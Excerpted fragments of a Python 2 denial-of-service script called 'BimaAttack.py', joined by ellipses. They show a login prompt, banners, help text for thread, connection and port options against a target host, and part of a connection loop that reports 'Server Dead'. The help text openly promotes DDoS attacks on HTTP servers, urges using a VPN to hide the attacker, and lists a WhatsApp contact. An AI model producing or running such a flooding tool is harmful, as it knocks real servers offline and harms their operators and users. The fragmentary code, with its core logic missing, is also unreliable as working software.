...
def login():
   os.system('clear')
   user = raw_input('\033[1;33mUsername : ')
   pasw = raw_input('\033[1;33mPass : ')
...
os.system("figlet Bima |lolcat")
os.system("figlet -f small Tools V2 |lolcat")
...
def helptext ():
        print "Usage: %s is 1.1 for GNU/Linux - Dos or DDos Tools <hostname> [-t] [-c] [-p]\n" % sys.argv[0]
        print " EX. python2 BimaAttack.py (IP Server) -t (Number Of Threads) -c (Number Connections/threads) -p (Port)"
        print ""
        print " Supports attacks: HTTP and WWW"
        print ""
        print "   -t\t\tSet number of threads"
        print "   -c\t\tSet number of connections per thread"
        print "   -p\t\tSet host port number"
        print ""
        print " DDos Coding By Bima"
        print ""
        print" Subscribe Channel Hack Hci And Covid GT"
        print " DDoS Attack Version 2."
        print ""
        print " Tools Modifed By Bima"
        print " Note:Abuser Banned By System!"
        print ""
        print " If You Want To Ddos Server Please Use Super Vpn!"
        print ""
        print "Contact for any BUGS or GLITCHES on Whatsapp 083841864141. Dont Share This Tools"
        exit()
        ...
        while True:
                ...
                for i in range (connection_amount):
                        ...
                        try:
                                ...
                                col()
                                print " # | - Server Dead THREAD %d: COULD NOT CONNECT" % num
                                bleh = True
                if bleh:
                        continue
